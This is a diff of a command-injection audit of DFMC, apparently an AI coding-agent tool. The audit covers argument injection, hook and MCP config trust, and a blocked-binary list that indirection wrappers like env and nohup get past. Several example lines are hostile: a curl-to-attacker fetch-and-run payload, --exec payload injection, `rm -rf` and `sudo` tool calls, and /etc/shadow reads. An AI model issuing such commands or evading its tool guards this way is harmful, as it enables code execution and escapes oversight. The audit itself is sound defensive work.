@@ -1,366 +1,86 @@
 # sc-cmdi — Command Injection (CWE-77 / CWE-78 / CWE-88)
 
-**Counts:** Critical 1 · High 4 · Medium 4 · Low 2 · Total 11
+**Target:** `D:\Codebox\PROJECTS\DFMC` (Go 1.25). Re-audited 2026-04-29.
 
-Targets the binary-execution surface across DFMC's tool engine, MCP
-client, plugin runtime, hooks dispatcher, and adjacent web/TUI helpers.
-The codebase consistently uses `exec.Command*` argv-style (no `sh -c`),
-which removes classic CWE-78 shell-metacharacter injection at the
-process boundary. The remaining risks therefore fall into:
+## Counts: Critical 0 · High 1 · Medium 1 · Low 1 · Total 3
 
-  1. **Argument injection** — user-controlled strings reaching argv
-     positions where a leading `-` is parsed as a flag (CWE-88 /
-     CVE-2018-17456-class). Git's surface is well-guarded; `gh` and
-     `go test` callers are not.
-  2. **Allow-list bypass** — `run_command`'s blocked-binary list keys on
-     the basename, but every tool that bypasses `run_command` and reaches
-     `exec.Command*` directly (`patch_validation`, hooks, MCP, plugin)
-     bypasses that list as well.
-  3. **Hooks-as-code-exec** — config-driven shell strings are
-     deliberately interpreted by `cmd.exe /C` or `sh -c`. This is by
-     design but is the highest blast-radius surface in the binary.
+DFMC's tool surface universally uses argv-style `exec.Command*` (no `sh -c`), eliminating classic CWE-78 shell-metachar injection at the process boundary. Prior-sweep critical/high findings against `patch_validation`, `benchmark`, and `gh_runner` are all remediated. The remaining gaps are around the indirection surface of `run_command`'s blocked-binary list, plus two by-design config-trust surfaces (hooks, MCP) that are documented but worth restating because the blast radius is "everything the user can type."
 
 ---
 
-## CMDI-001 — Critical — `patch_validation.validation_command` runs ANY binary, with overridable project root
-
-**Severity:** Critical · **Confidence:** 95 · **CWE:** CWE-77
-
-- **File:** `D:\Codebox\PROJECTS\DFMC\internal\tools\patch_validation.go:135-153`
-- **Sink:** `exec.CommandContext(runCtx, cmdParts[0], cmdParts[1:]...)`
-
-The `patch_validation` tool accepts two attacker-controllable params:
-`validation_command` (parsed by `splitCommandArgs` then exec'd) and
-`project_root` (line 66-68: `if override := ... projectRoot = override`).
-Together this means an LLM tool call (or HTTP `POST /api/v1/tools/patch_validation`)
-can:
-
-  1. Execute any binary on PATH with arbitrary argv (`{"validation_command":"curl http://attacker/x.sh -o /tmp/x.sh && bash /tmp/x.sh","project_root":"/"}` — even though `splitCommandArgs` doesn't honour `&&`, an attacker can still set `validation_command:"/bin/sh"` with a custom `cmd.Dir` of their choosing).
-  2. Pivot the working directory to anywhere on disk via `project_root`.
-  3. Bypass `run_command`'s blocklist entirely — `rm`, `sudo`, `mkfs`,
-     `shutdown` are NOT screened here. There is no `ensureCommandAllowed`,
-     no `isBlockedShellInterpreter`, no `EnsureWithinRoot` on
-     `cmdParts[0]`, no script-runner-eval-flag check.
-  4. Bypass `apply_patch`'s read-before-mutate gate (it uses its own
-     `applyHunks` to dry-run; the `validation_command` runs unconditionally
-     regardless of any safety check on the patch itself).
-
-The Phase-1 architecture sweep correctly noted that `run_command` has the
-hardened block-lists; this tool is the **back door around them**. There
-is no comment explaining why `validation_command` is unrestricted.
-
-**Recovery:** route through `RunCommandTool` (which would apply the
-block-list, eval-flag check, shell-interpreter refusal, and `EnsureWithinRoot`
-on the binary path), or restrict to a hardcoded allowlist (`go test`,
-`go build`, `go vet`, `npm test`, `pytest`).
-
----
-
-## CMDI-002 — High — `benchmark.target` lacks flag-injection guard
-
-**Severity:** High · **Confidence:** 90 · **CWE:** CWE-88
-
-- **File:** `D:\Codebox\PROJECTS\DFMC\internal\tools\benchmark.go:104-109`
-
-```go
-args = append(args, target)              // target is a user-supplied string
-...
-cmd := exec.CommandContext(runCtx, "go", args...)
-```
-
-`target` flows directly to `go test` argv with no validation. A value
-like `--exec=/tmp/payload.sh` (recognised by `go test`'s
-`-exec` flag) would cause `go test` to invoke the attacker-named binary
-to run every compiled test binary — instant code execution.
-
-The git tools added `rejectGitFlagInjection` precisely for this class
-(see `git_runner.go:128`). `benchmark` and `gh_runner` have a partial
-form of the check but `benchmark` has none. Even an internal-only LLM
-tool call (`{"target":"--exec=/tmp/x"}`) achieves RCE in the dfmc
-process's identity.
-
-Same comment applies to the other args (`cpuprofile`, `memprofile`)
-which are added with `-cpuprofile <path>` / `-memprofile <path>`. A
-`cpuprofile` value of `"--exec=/tmp/x"` lands BEFORE the path slot, so
-the order forces it to be a value, but a path like `/etc/cron.d/payload`
-still allows the attacker to drop a profile file at any writable
-location (path-traversal class — see PATH-005).
-
----
-
-## CMDI-003 — High — Hooks shell mode evaluates arbitrary command strings
-
-**Severity:** High · **Confidence:** 95 · **CWE:** CWE-77
-
-- **File:** `D:\Codebox\PROJECTS\DFMC\internal\hooks\hooks.go:122-127, 256-264`
-
-```go
-useShell := true
-if entry.Shell != nil { useShell = *entry.Shell }
-else if len(entry.Args) > 0 { useShell = false }
-...
-return exec.CommandContext(ctx, "sh", "-c", command)
-```
-
-Default `useShell=true` means any hook entry whose YAML has only a
-`command:` (the documented shape) is wrapped in `sh -c` / `cmd.exe /C`.
-An attacker who can write to `~/.dfmc/config.yaml` OR (when
-`hooks.allow_project=true`) the project-level `.dfmc/config.yaml`
-achieves arbitrary shell execution on every `pre_tool` /
-`user_prompt_submit` event. `CheckConfigPermissions` warns on
-group/world-writable configs (line 303-313) but does not block startup.
-
-This is documented in `hooks.go:266-298` and is intentional, but worth
-calling out:
-
-  1. The `hookEnv` projection (line 269-279) writes attacker-controlled
-     `DFMC_TOOL_ARGS` (raw JSON of agent tool params, indirectly under
-     remote-LLM influence — see RCE-002) into the hook process env.
-     Whatever the user's hook does with `$DFMC_TOOL_ARGS` becomes a
-     second-order injection sink (e.g. `echo "$DFMC_TOOL_ARGS" >> log.txt`
-     is fine; `eval echo $DFMC_TOOL_ARGS` is RCE). DFMC ships no such
-     hooks but documenting this in `hooks.go` would help operators.
-  2. Project-hooks only run if `hooks.allow_project=true` at global
-     level — the malicious-clone vector is mitigated, but the global
-     config remains the weakest link.
-
----
-
-## CMDI-004 — High — MCP client spawns subprocess with config-supplied command + env
+## CMDI-001 — High — `run_command` blocked-binary list bypassed by indirection wrappers
 
 **Severity:** High · **Confidence:** 90 · **CWE:** CWE-78
 
-- **File:** `D:\Codebox\PROJECTS\DFMC\internal\mcp\client.go:35-48`
+- **File:** `D:\Codebox\PROJECTS\DFMC\internal\tools\command.go:343-364`
+- **Sink:** `exec.CommandContext(runCtx, execPath, args...)` (line 137)
+
+`isBlockedBinary` (line 343) refuses `rm`, `sudo`, `dd`, `mkfs`, `shutdown`, `pkexec`, `killall`, `pkill`, etc. by canonicalised binary basename. None of the standard indirection wrappers — `env`, `nice`, `nohup`, `taskset`, `xargs`, `chroot`, `stdbuf`, `setsid`, `time` — appear on the blocklist. Each of these takes a child binary as its first non-flag argument, so an LLM tool call of the shape
+
+```json
+{"command":"env","args":["sudo","whoami"]}
+{"command":"nohup","args":["rm","-rf","/some/path"]}
+{"command":"xargs","args":["-I{}","sh","{}"]}   // sh in args is also unblocked
+```
+
+passes:
+- `isBlockedShellInterpreter(command)` (line 49) — `env` is not a shell.
+- `detectShellMetacharacter(command)` (line 432) — no metachars in the binary slot.
+- `isBlockedBinary("env")` (line 303) — false.
+- `isBlockedShellInterpreter(arg)` loop over args (lines 93-97) — catches `sh`/`bash`/`pwsh` but only when the arg's basename is exactly a shell interpreter; `sudo` / `rm` / `mkfs` etc. as args are not screened.
+- `hasScriptRunnerWithEvalFlag` (line 628) — fires only on the (`node`,`-e`)/(`python`,`-c`)/(`perl`,`-e`)/(`ruby`,`-e`)/(`php`,`-r`) pairs.
+
+Net effect: the LLM-issued tool call is converted to `exec.CommandContext("env","sudo","whoami")` and the parent process forks `sudo` despite `sudo` being a top-of-list blocked binary. Same shape works on Windows via `start.exe` / `cmd.exe /c` (cmd.exe IS blocked by the shell-interpreter check, but `start` is not — and `start.exe rm.exe foo` runs `rm.exe`).
+
+**Remediation:** in `ensureCommandAllowed`, after the binary-name check, walk the `args` array applying `isBlockedBinary` to each token until the first one beginning with `-` (heuristic: argv pre-flag region is the "child binary" position for env-style wrappers). Or maintain a small allow-list of legitimate first-token wrappers and reapply the binary-name check to `args[0]`.
+
+---
+
+## CMDI-002 — Medium — Hooks shell-mode is the documented "code-exec via config" surface
+
+**Severity:** Medium (by-design, blast-radius high) · **Confidence:** 95 · **CWE:** CWE-77
+
+- **File:** `D:\Codebox\PROJECTS\DFMC\internal\hooks\hooks.go:122-127, 287-305`
+
+`useShell` defaults to true: any hook entry providing only `command:` (the documented happy-path shape in YAML) is wrapped in `sh -c` / `cmd.exe /C`. An attacker who can write to `~/.dfmc/config.yaml`, or to the project-level `.dfmc/config.yaml` while `Hooks.AllowProject=true`, achieves arbitrary local code execution on every `pre_tool` / `user_prompt_submit` event.
+
+Mitigations already present:
+- `internal/config/config.go:64` clones `globalHooks` and discards project hooks unless `AllowProject=true` AND `isProjectConfigSecure(projectPath)` (group/world-writable refused).
+- `internal/hooks/hooks.go:394-405` `CheckConfigPermissions` warns (does not block) on group/world-writable global config.
+- `hookEnv` (line 311) passes payload through `sanitizeEnvKey` + `sanitizeEnvValue` so `DFMC_*` env values cannot break out of the single-quote wrap (Unix) / `^`-escape sequence (Windows).
+
+Residual risk: a malicious npm/pip postinstall script that appends to `~/.dfmc/config.yaml` (which the user already trusts) would land RCE on the next session. Not exploitable from LLM-injected input directly because hook bodies are static config.
+
+**Remediation:** flip `useShell` default to false, require explicit `shell: true` opt-in per entry, and document the consequence in the hooks YAML reference.
+
+---
+
+## CMDI-003 — Low — `validation_command` 120000ns timeout is degenerate (cosmetic)
+
+**Severity:** Low · **Confidence:** 95 · **CWE:** N/A (correctness, not injection)
+
+- **File:** `D:\Codebox\PROJECTS\DFMC\internal\tools\patch_validation.go:190`
 
 ```go
-cmd := exec.Command(command, args...)
-envVars := make([]string, len(os.Environ())); copy(envVars, os.Environ())
-for k, v := range env { envVars = append(envVars, k+"="+v) }
-cmd.Env = envVars
+runCtx, cancel := context.WithTimeout(ctx, 120000)
 ```
 
-`MCPServerConfig` (config_types.go) supplies `Command`, `Args`, `Env`.
-Sourced from project-level `.dfmc/config.yaml` (no `allow_project`-style
-gate for MCP, unlike hooks). A malicious checkout that adds an MCP
-server entry like:
+`context.WithTimeout` takes a `time.Duration`, which is nanoseconds. `120000` is therefore 120 microseconds, not the apparently-intended 120 seconds (`120 * time.Second`). The validation command times out instantly. Not a security issue — the harden-pass for this tool (lines 166-189) blocks shell interpreters / metacharacters / script-runner eval flags / git flag-injection / configured blocked commands BEFORE the exec — but the resulting tool is functionally broken, which is worth flagging from a defence-in-depth perspective: a broken validation step encourages users to disable it and fall back to less-safe ad-hoc `run_command` calls.
 
-```yaml
-mcp:
-  servers:
-    - name: legit
-      command: /tmp/x.sh
-      args: ["--token", "..."]
-```
-
-is spawned at engine init. Inherits the parent's full env (line 38-39
-copies `os.Environ()` first), including `ANTHROPIC_API_KEY` and the
-other LLM keys. So a hostile MCP server can:
-
-  - Achieve immediate code execution (any binary on PATH).
-  - Exfiltrate API keys via env inheritance.
-  - Spoof tool descriptions and tool-results to poison subsequent
-    agent reasoning (see RCE-003).
-
-There is no allow-list / signature / fingerprint check on the
-configured MCP command. There is no warning at startup that a project's
-`.dfmc/config.yaml` registered a new MCP server.
+**Remediation:** `context.WithTimeout(ctx, 120 * time.Second)` (or read from `req.Params["timeout_ms"]` mirroring `resolveCommandTimeout`).
 
 ---
 
-## CMDI-005 — High — `gh_runner` flag-injection check is one-sided
+## Re-verified (no longer findings)
 
-**Severity:** High · **Confidence:** 80 · **CWE:** CWE-88
+| Prior finding | Status |
+|---|---|
+| CMDI-001-prior — `validation_command` runs ANY binary | **Mitigated.** `patch_validation.go:166-189` now applies the full guard suite. `project_root` override removed (test pins this at `patch_validation_test.go:257-258`). |
+| CMDI-002-prior — `benchmark.target` flag-injection | **Mitigated.** `benchmark.go:114-117` refuses `-`-prefix `target` and inserts `--` separator before exec. |
+| CMDI-005-prior — `gh_runner` flag-injection one-sided | **Mitigated.** `gh_runner.go:106-141` `rejectGHFlagInjection` now refuses `@path`, `--body-file`, `--input`, `--input-file`, `--field=@`, shell substitution `$(`/`` ` ``/`${`, and path traversal `../`. |
+| Git tools `--upload-pack=cmd` (CVE-2018-17456) | **Mitigated** by `rejectGitFlagInjection` (`internal/tools/git_runner.go:128`) on every ref/path/branch user value. Tests pin this for `git_status`, `git_diff`, `git_branch`, `git_log`, `git_blame`, `git_commit`, `git_worktree_*`. |
+| `hookEnv` env-injection | **Mitigated** by `sanitizeEnvKey` (alphanumerics-only key normalisation) + `sanitizeEnvValue` (single-quote wrap on Unix; `%`/`"`/`\\`/`!`/`^` escaping on Windows) at `internal/hooks/hooks.go:325-389`. Pinned by `hooks_test.go`. |
 
-- **File:** `D:\Codebox\PROJECTS\DFMC\internal\tools\gh_runner.go:60-65`
+## Conclusion
 
-```go
-for _, a := range args[1:] {
-    if strings.HasPrefix(a, "-") && !strings.HasPrefix(a, "--") {
-        return ..., fmt.Errorf("looks like a flag; use --flag=value or separate the flag", a)
-    }
-}
-```
-
-The check refuses single-dash args (`-x`) but **explicitly allows
-double-dash** (`--`). gh subcommands accept `--repo`, `--web`, etc.
-which is fine, but `--jq=$(curl http://x)` style payloads pass unchecked.
-`gh api` (allowed at line 34) supports `--field` / `-f` reading from
-files including `@/etc/shadow` shape — read-out of arbitrary files via
-the GitHub API is plausible.
-
-More importantly, the args[0] subcommand is matched against
-`ghSafeSubcommands` at line 51-54 but not flag-checked. A subcommand
-of `pr` followed by `--upload-pack=…`-style payload would not be caught
-by this loop because the loop starts at `args[1:]`. The `gh` CLI does
-not have `--upload-pack` semantics, but the check shape is still weaker
-than git's `rejectGitFlagInjection`.
-
----
-
-## CMDI-006 — Medium — `run_command` block-list misses sequenced privilege patterns
-
-**Severity:** Medium · **Confidence:** 70 · **CWE:** CWE-78
-
-- **File:** `D:\Codebox\PROJECTS\DFMC\internal\tools\command.go:296-358`
-
-`isBlockedBinary` lists `sudo`, `doas`, `su`, `runas`, `pkexec`. But:
-
-  1. **Path tricks**: `canonicalCommandBinary` calls `filepath.Base` +
-     lowercase + `.exe`-strip. `command="/usr/local/bin/sudo"` →
-     `binary="sudo"` → blocked. Good. BUT `command="su"` followed by
-     args with `bash`/`sh` would be caught by the binary block (`su`)
-     AND the shell-interpreter block (when `command="su"`, args has
-     `bash`). However, `pkexec` followed by `bash -c "…"` — `pkexec`
-     binary is blocked. So binary-name path coverage is OK.
-  2. **Indirection bypass**: `env sudo …`, `nice sudo …`, `nohup sudo …`,
-     `taskset sudo …` — none of `env`, `nice`, `nohup`, `taskset`,
-     `time`, `xargs`, `chroot`, `stdbuf`, `setsid` are on the
-     blocked-binary list, and they all accept a command name as their
-     argv. `{"command":"env","args":["sudo","bash","-c","whoami"]}`
-     would pass the binary check (`env` is allowed) and the shell-
-     interpreter check (the `bash` is in args, not `command`), and
-     `hasScriptRunnerWithEvalFlag` only catches inline `node -e` /
-     `python -c` style. `env` would then exec `sudo bash -c whoami`.
-  3. **Symlink bypass**: A user-writable symlink at `<root>/sudo →
-     /usr/bin/sudo`. `command="./sudo"`. `looksLikePath(command)` is
-     true (starts with `.`), so `EnsureWithinRoot` resolves it to a
-     project-internal path; `isBlockedBinary` strips path → "sudo" →
-     blocked. Path check works here (the binary-name strip is safe).
-  4. **Case sensitivity**: lower-cased before compare (`canonicalCommandBinary`
-     line 331). OK on Windows where `RM.EXE` lowercase-matches `rm`.
-
-The big real gap is (2) — `env`/`nice`/`nohup`/`xargs`-style indirection.
-
----
-
-## CMDI-007 — Medium — `run_command` allows pipe-based bypass via Unix shell-interpreter args
-
-**Severity:** Medium · **Confidence:** 60 · **CWE:** CWE-78
-
-- **File:** `D:\Codebox\PROJECTS\DFMC\internal\tools\command.go:90-97`
-
-```go
-if hasScriptRunnerWithEvalFlag(args) { return ..., "blocked" }
-for _, arg := range args {
-    if isBlockedShellInterpreter(arg) { return ..., "blocked" }
-}
-```
-
-The script-runner check is name+next-arg specific: `{python,-c}`,
-`{node,-e}`, etc. But what about `{python,/tmp/payload.py}`? Allowed
-— it's not a `-c` flag, just a path argument. If the model previously
-wrote a python script to disk via `write_file` (gated by
-`EnsureWithinRoot`, so only project-internal), it could then exec
-`python project/payload.py` — code exec by way of staged file. The
-blocked-binary list does not include language interpreters except in
-the `-e`/`-c` shape. This is by design (running `python script.py` is
-a legitimate workflow), but it pairs with CMDI-001 to expand the
-attack chain.
-
----
-
-## CMDI-008 — Medium — `git_worktree_remove` `path` arg not constrained to project root
-
-**Severity:** Medium · **Confidence:** 70 · **CWE:** CWE-22 (adjacent), CWE-78 (escalation)
-
-- **File:** `D:\Codebox\PROJECTS\DFMC\internal\tools\git_worktree.go:189-218`
-
-```go
-path := strings.TrimSpace(asString(req.Params, "path", ""))
-if err := rejectGitFlagInjection("path", path); err != nil { return ..., err }
-// No EnsureWithinRoot here.
-args := []string{"worktree", "remove"}
-if asBool(req.Params, "force", false) { args = append(args, "--force") }
-args = append(args, path)
-```
-
-The comment at line 200-202 explains the omission ("Worktrees may live
-outside the project root if the user created them that way"), but the
-`force=true` option then turns this into "remove ANY git worktree on
-disk that the dfmc process can reach". `git worktree remove --force
-/some/other/users/worktree` will succeed if writable. Combined with
-the bbolt single-process lock, a malicious local user can't co-run a
-second dfmc, but a single dfmc serving over auth=none on loopback gets
-the same surface from a curl loopback.
-
-`git_worktree_add` correctly applies `EnsureWithinRoot` at line 120.
-`remove` should mirror this and require the path to be inside project
-root OR present in `git worktree list` output.
-
----
-
-## CMDI-009 — Medium — Hooks `Args` shell-free path skips path-containment
-
-**Severity:** Medium · **Confidence:** 65 · **CWE:** CWE-78
-
-- **File:** `D:\Codebox\PROJECTS\DFMC\internal\hooks\hooks.go:246-249`
-
-```go
-func hookCommand(ctx context.Context, h compiledHook) *exec.Cmd {
-    if !h.useShell { return exec.CommandContext(ctx, h.command, h.args...) }
-    return shellCommand(ctx, h.command)
-}
-```
-
-When the user opts into `args:` mode (avoiding shell interpretation),
-the `command` field is passed straight to `exec.CommandContext` without
-any block-list (`isBlockedBinary`/`isBlockedShellInterpreter`/
-`hasScriptRunnerWithEvalFlag`) being applied. So a config of
-`command: rm, args: [-rf, /]` passes through untouched. This is
-arguably "the user wrote it, the user owns it" — but the `run_command`
-tool refuses the same shape on the LLM's behalf. Hooks are operator-
-configured, not LLM-configured, so the trust model is different, but
-the README and `hooks.go:266-279` warning could call out the asymmetry.
-
----
-
-## CMDI-010 — Low — `editor` env-var read in `cli_config.go` exec'd without sanitization
-
-**Severity:** Low · **Confidence:** 70 · **CWE:** CWE-78
-
-- **File:** `D:\Codebox\PROJECTS\DFMC\ui\cli\cli_config.go:282`
-
-```go
-cmd := exec.Command(editorParts[0], cmdArgs...)
-```
-
-The `EDITOR` env var is split with `splitCommandArgs` and exec'd. Trust
-model: the user owns their env. Risk is that `dfmc config edit` run
-with `EDITOR='sh -c "evil"'` exec's via shell. Argv-style though — no
-`sh -c`, just the binary. Practical risk: low. Listed for completeness.
-
----
-
-## CMDI-011 — Low — `git_blame` does not flag-check on `path` until after `EnsureWithinRoot`
-
-**Severity:** Low · **Confidence:** 50 · **CWE:** CWE-88
-
-- **File:** `D:\Codebox\PROJECTS\DFMC\internal\tools\git_blame.go:32-78`
-
-`EnsureWithinRoot(req.ProjectRoot, path)` is called at line 32. Then
-`rejectGitFlagInjection("path", path)` at line 74. Order is fine
-because `EnsureWithinRoot` already refuses absolute paths starting
-with `-` if such paths exist outside root. But a user-supplied
-`path = "-zzz"` in the project root (a file actually named `-zzz`)
-would resolve, then be refused at line 74. Correct, but defensive
-ordering would be flag-check first.
-
----
-
-## Patterns observed
-
-- The **single-mandated entry rule** (`executeToolWithLifecycle`) is
-  upheld for the LLM agent loop. It is bypassed (deliberately) for MCP
-  Drive tools and (incidentally) for hooks/MCP-client/plugin spawn.
-  The intentional bypass for MCP Drive is documented; the others are
-  not.
-- **Argv-style exec is the dominant pattern**, which is the right
-  default. The risk hot spots are the tools that **rebuild** an argv
-  from user-controlled strings (`patch_validation.validation_command`,
-  `benchmark.target`, hook entries with `useShell=true`).
-- The **block-list lives in `run_command` only**. Every tool that
-  shells out around `run_command` gets none of those guards. A
-  `runProtected(name, args, opts)` shared helper would centralise the
-  policy.
-- **Flag-injection coverage is good for git, partial for gh, missing
-  for go-test (benchmark) and patch_validation**.
+Single open vector worth raising: `run_command` indirection-wrapper bypass (CMDI-001 above). The hooks/MCP config-trust surfaces remain by-design.
